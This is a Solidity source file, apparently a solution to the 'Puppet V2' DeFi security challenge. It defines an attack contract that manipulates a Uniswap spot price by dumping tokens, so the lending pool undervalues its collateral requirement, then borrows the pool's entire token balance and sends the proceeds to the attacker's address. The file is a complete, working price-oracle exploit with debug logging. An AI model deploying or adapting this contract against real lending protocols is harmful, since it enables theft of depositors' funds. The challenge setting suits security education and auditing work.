// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface IWETH is IERC20{
    function deposit() external payable;
}

interface IPuppetPool {
    function borrow(uint256 borrowAmount) external;
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
}

interface IUniswapV2Router02 {
    
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

contract PuppetV2Attack {
    using Address for address payable;

    IERC20 token;
    IWETH weth;
    IPuppetPool pool;
    IUniswapV2Router02 router;
    address payable attackerEOA;

    constructor(
        IERC20 _token,
        IWETH _weth,
        IPuppetPool _pool,
        IUniswapV2Router02 _router,
        address payable _attackerEOA
    ) {
        token = _token;
        weth = _weth;
        pool = _pool;
        router = _router;
        attackerEOA = _attackerEOA;
    }

    

    function attack() external payable {

        console.log("collateral needed is %s", pool.calculateDepositOfWETHRequired(token.balanceOf(address(pool))) / 10**18 );

        //transfer tokens to attack contract
        token.transferFrom(
            address(attackerEOA), 
            address(this), 
            token.balanceOf(address(attackerEOA))
        );

        //approve tokens for router
        token.approve(address(router), type(uint256).max);

        //swap tokens to change pool dynamic
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            token.balanceOf(address(this)), 
            0, 
            path, 
            address(this), 
            block.timestamp * 2);
        console.log("after token swap");
        console.log("collateral needed is %s", pool.calculateDepositOfWETHRequired(token.balanceOf(address(pool)))/ 10**18 );
        console.log("my token balance is %s", token.balanceOf(address(this)) / 10**18);
        console.log("my eth balance is %s", address(this).balance / 10**18);



        //wrap weth and approve for collateral
        weth.deposit{value: address(this).balance}();
        weth.approve(address(pool), type(uint256).max);

        //borrow everything in pool
        uint256 _poolBal = token.balanceOf(address(pool));
        pool.borrow(_poolBal);

        console.log("after borrow");
        console.log("my token balance is %s", token.balanceOf(address(this)) / 10**18);
        console.log("my eth balance is %s", address(this).balance / 10**18);
        console.log("my weth balance is %s", weth.balanceOf(address(this)) / 10**18);


        //approve leftover weth for router and swap for rest of tokens
        weth.approve(address(router), type(uint256).max);

        address[] memory path2 = new address[](2);
        path2[0] = address(weth);
        path2[1] = address(token);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            weth.balanceOf(address(this)), 
            0, 
            path2, 
            address(this), 
            block.timestamp * 2);

        //transfer tokens to attackerEOA
        token.transfer(attackerEOA, token.balanceOf(address(this)));

    }

}